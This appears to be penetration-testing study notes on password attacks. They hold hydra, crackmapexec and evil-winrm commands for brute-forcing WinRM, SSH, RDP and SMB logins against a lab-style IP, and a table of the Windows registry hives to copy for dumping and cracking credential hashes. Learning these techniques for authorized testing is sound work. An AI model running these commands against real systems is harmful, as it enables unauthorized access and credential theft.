# Password Attacks
## Network Services
* crackmapexex (mssql, smb, ssh, winrm)
<pre>
<b># WinRM</b>
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
evil-winrm -i <target-IP> -u <username> -p <password>
evil-winrm -i 10.129.42.197 -u user -p password

<b># SSH</b>
hydra -L user.list -P password.list ssh://10.129.42.197
ssh user@10.129.42.197

<b># RDP</b>
hydra -L user.list -P password.list rdp://10.129.42.197
xfreerdp /v:<target-IP> /u:<username> /p:<password>
xfreerdp /v:10.129.42.197 /u:user /p:password

<b># SMB</b>
hydra -L user.list -P password.list smb://10.129.42.197
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
smbclient -U user \\\\10.129.42.197\\SHARENAME
</pre>
## Attacking SAM
There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below:  
|Registry Hive|Description|
|---|---|
|hklm\sam|Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.|
|hklm\system|Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.|
|hklm\security|Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.|
